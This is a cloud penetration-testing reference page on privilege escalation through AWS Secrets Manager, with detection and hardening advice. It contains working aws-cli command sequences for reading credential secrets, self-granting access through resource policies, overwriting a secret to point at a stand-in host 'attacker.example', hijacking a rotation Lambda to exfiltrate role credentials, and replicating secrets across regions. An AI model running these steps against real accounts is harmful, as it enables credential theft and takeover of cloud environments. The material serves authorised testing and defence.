---
cstg_id: CSTG-AWS-SECRETS-MANAGER-PRIVESC
title: "AWS Secrets Manager - Privilege Escalation"
provider: aws
service: secrets-manager
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - secretsmanager:GetSecretValue
  - secretsmanager:BatchGetSecretValue
  - secretsmanager:PutSecretValue
  - secretsmanager:UpdateSecret
  - secretsmanager:PutResourcePolicy
  - secretsmanager:ReplicateSecretToRegions
  - secretsmanager:RotateSecret
  - secretsmanager:CancelRotateSecret
  - lambda:UpdateFunctionCode
  - iam:PassRole
  - kms:Decrypt
references:
  - "https://docs.aws.amazon.com/secretsmanager/latest/userguide/auth-and-access_resource-based-policies.html"
  - "https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets.html"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
license: CC BY-SA 4.0
---

## Summary

Secrets Manager enables privilege escalation in two distinct ways. First and most directly, the
**value of a secret may itself be a credential to a more-privileged identity** - long-lived IAM
access keys, a role-assumption token, database master credentials, or an API key for a system that
can be turned back into AWS access. Reading such a secret with `GetSecretValue` is escalation in a
single call. Second, the **control plane around a secret** can be abused: a principal that can modify
a secret's resource policy can grant itself read access to a secret it could not otherwise read; a
principal that can write a secret value can poison a credential consumed by a privileged workload; and
because rotation runs through a Lambda function under an execution role, the rotation machinery is a
PassRole/code-execution surface.

This page is keyed by the permission (or permission pair) that enables each path, assuming a
low-privilege principal (assumed-breach). Enumerate which secrets are reachable and what they contain
before acting - see [AWS Secrets Manager - Enumeration](../02-services/aws-secrets-manager-enum.md).
The escalation magnitude equals the difference between the current principal's privileges and those
granted by the secret value or the target role reached through it.

## Prerequisites

A principal holding one or more of the permissions below. For value-read paths, `GetSecretValue` plus
`kms:Decrypt` (when a customer-managed key is used). For resource-policy paths,
`secretsmanager:PutResourcePolicy`. For rotation/Lambda paths, the relevant `lambda:*` and
`iam:PassRole` permissions for a role whose trust policy allows `lambda.amazonaws.com`. Confirm
effective permissions (e.g. with `iam:SimulatePrincipalPolicy`) and the set of reachable secrets and
passable roles before attempting any path.

## Exploitation

### `secretsmanager:GetSecretValue` (credential stored in a secret)

The most common path. Read the secret; if the value is an AWS credential, assume the identity it
grants. The escalation is whatever that identity can do.

```bash
aws secretsmanager get-secret-value --secret-id prod/ci/deploy-keys --query SecretString --output text
# If the value contains an IAM access key pair, use it directly:
export AWS_ACCESS_KEY_ID=AKIA...; export AWS_SECRET_ACCESS_KEY=...; unset AWS_SESSION_TOKEN
aws sts get-caller-identity                       # confirm the new (more-privileged) identity
```

Secret values frequently also contain database master passwords, third-party tokens (e.g. CI/CD,
container registries, source control), or private keys. Each can be a pivot: a CI token may allow
pushing a pipeline change that runs under a privileged role; a registry token enables image
poisoning; a DB master password enables data-store takeover. `BatchGetSecretValue` reads many secrets
at once to find the one that escalates.

### `secretsmanager:PutResourcePolicy` (self-grant read of an unreadable secret)

If the identity policy denies reading a high-value secret but allows editing its resource policy,
attach a resource policy that grants the current principal `GetSecretValue`, then read it. The
resource policy is evaluated alongside the identity policy, so this can unblock a read.

```bash
S=prod/db/master
ME=$(aws sts get-caller-identity --query Arn --output text)
cat > rp.json <<JSON
{ "Version":"2012-10-17","Statement":[{"Effect":"Allow",
  "Principal":{"AWS":"$ME"},"Action":"secretsmanager:GetSecretValue","Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --secret-id "$S" --resource-policy file://rp.json
aws secretsmanager get-secret-value --secret-id "$S" --query SecretString --output text
```

This still requires `kms:Decrypt` on a customer-managed key; if decrypt is independently denied the
resource-policy edit alone is insufficient, which is precisely why a scoped CMK is a stronger gate.

### `secretsmanager:PutSecretValue` / `UpdateSecret` (poison a credential consumed by a privileged workload)

A secret is often the credential a privileged workload uses to authenticate. Overwriting the value
with attacker-controlled credentials causes that workload to authenticate to a system the operator
controls - or, where the secret feeds an internal trust (e.g. a service's signing key or a webhook
secret), undermines that trust. This is an indirect path that depends on what consumes the secret.

```bash
aws secretsmanager put-secret-value --secret-id <consumed-secret> \
  --secret-string '{"host":"attacker.example","username":"x","password":"y"}'
# The next workload that reads this secret connects to the attacker-controlled endpoint.
```

### `iam:PassRole` + `lambda:UpdateFunctionCode` (rotation Lambda hijack)

Rotation is performed by a Lambda function that runs under an execution role and holds
`GetSecretValue`/`PutSecretValue` on its target secrets (and often broad data-store permissions to
reset credentials). If the principal can modify the rotation function's code, the operator's code
runs under that execution role on the next rotation - inheriting its permissions. Identify the
rotation function from the secret metadata, replace its code, and trigger rotation.

```bash
RL=$(aws secretsmanager describe-secret --secret-id <S> --query RotationLambdaARN --output text)
FN=${RL##*:function:}
# Package handler that exfiltrates the role's credentials (env vars) or performs privileged actions:
aws lambda update-function-code --function-name "$FN" --zip-file fileb://function.zip
aws secretsmanager rotate-secret --secret-id <S>          # triggers the function under its role
```

See [AWS Lambda - Privilege Escalation](aws-lambda-privesc.md) for the full Lambda PassRole
mechanics; configuring a *new* secret to use an attacker-chosen rotation Lambda role is the
`RotateSecret`-with-PassRole variant of the same primitive.

### `secretsmanager:RotateSecret` / `CancelRotateSecret` (force or stall a known value)

Forcing rotation against a poisoned rotation function (above) executes attacker code; cancelling
rotation on a credential the operator has already read freezes that value so the stolen credential
stays valid. `CancelRotateSecret` is therefore a persistence-leaning aid to a value-read path.

### `secretsmanager:ReplicateSecretToRegions` (read in a less-guarded region)

Replicating a secret to another region can place a readable copy where detective controls or deny
conditions (e.g. region-scoped SCPs/IP conditions) do not apply, then the replica is read there.

```bash
aws secretsmanager replicate-secret-to-regions --secret-id <S> \
  --add-replica-regions Region=us-west-1
aws secretsmanager get-secret-value --secret-id <S> --region us-west-1 --query SecretString --output text
```

## Misconfigurations & Findings

- IAM credentials or other AWS-usable credentials stored as secret values - the most direct path.
- `secretsmanager:PutResourcePolicy` granted to non-admin principals, enabling self-grant of reads.
- `secretsmanager:GetSecretValue` on `Resource: *` rather than specific secret ARNs.
- Encryption with the AWS-managed key (`aws/secretsmanager`), so no independent `kms:Decrypt` gate
  protects the value once `GetSecretValue` is held.
- Rotation Lambda execution roles far broader than needed, plus `lambda:UpdateFunctionCode` reachable
  by lower-privileged principals - a code-execution-under-role path.
- `iam:PassRole` with a wildcard/broad resource alongside the ability to create or configure a
  rotation function.
- Resource policies granting cross-account or public read without `aws:SourceAccount`/`PrincipalOrgID`.

## Detection & Logging

`GetSecretValue`, `BatchGetSecretValue`, `PutSecretValue`, `UpdateSecret`, `PutResourcePolicy`,
`RotateSecret`, `CancelRotateSecret`, and `ReplicateSecretToRegions` are all CloudTrail **management
events** and are always logged. High-signal correlations: a `PutResourcePolicy` on a secret
immediately followed by a `GetSecretValue` by the same principal (self-grant then read); a
`GetSecretValue` followed by use of the recovered credential under a *different* identity from an
unusual source IP (visible in CloudTrail as the new principal); `UpdateFunctionCode` on a rotation
Lambda followed by `RotateSecret`; and `ReplicateSecretToRegions` followed by a read in the new
region. Credentials extracted from a secret and reused elsewhere appear under the extracted identity
from a foreign `sourceIPAddress` - **GuardDuty** credential-exfiltration and anomalous-access
detections flag this. KMS `Decrypt` events with the secret ARN in the encryption context correlate
with value reads. IAM Access Analyzer flags resource-policy changes that introduce external access.

## Remediation & Hardening

- Do not store long-lived IAM access keys as secrets; use roles and short-lived credentials.
- Scope `secretsmanager:GetSecretValue` to specific secret ARNs and restrict `PutResourcePolicy`,
  `PutSecretValue`, `UpdateSecret`, and `RotateSecret` to controlled administrative roles; deny
  broadly via SCP.
- Encrypt secrets with **customer-managed KMS keys** and a scoped key policy so `kms:Decrypt` remains
  an independent gate that a resource-policy edit cannot bypass.
- Constrain resource policies to specific principals with `aws:SourceAccount`/`aws:PrincipalOrgID`;
  review continuously with IAM Access Analyzer.
- Scope `iam:PassRole` for rotation functions by `Resource` and `iam:PassedToService`; give rotation
  execution roles least privilege and protect their code with AWS Signer code signing.
- Enable rotation with bounded lifetimes and alert on `CancelRotateSecret` for sensitive secrets.
- Alert on self-grant patterns (`PutResourcePolicy` then `GetSecretValue`), high-volume reads, and
  cross-region replication of sensitive secrets; enable GuardDuty.

## Tools

- **aws-cli** - perform and verify each path.
- **Pacu** - secrets and IAM privesc modules automate discovery and abuse of these paths
  (active/intrusive - requires explicit rules of engagement).
- **PMapper** - computes whether the current principal can reach a privileged identity via a stored
  credential or the rotation-Lambda path.
- **CloudFox** - enumerates reachable secrets and the roles that can read or rotate them.

## References

- AWS - Resource-based policies for Secrets Manager
- AWS - Rotating Secrets Manager secrets
- Rhino Security Labs - AWS privilege escalation methods and mitigation
- hackingthe.cloud - IAM privilege escalation
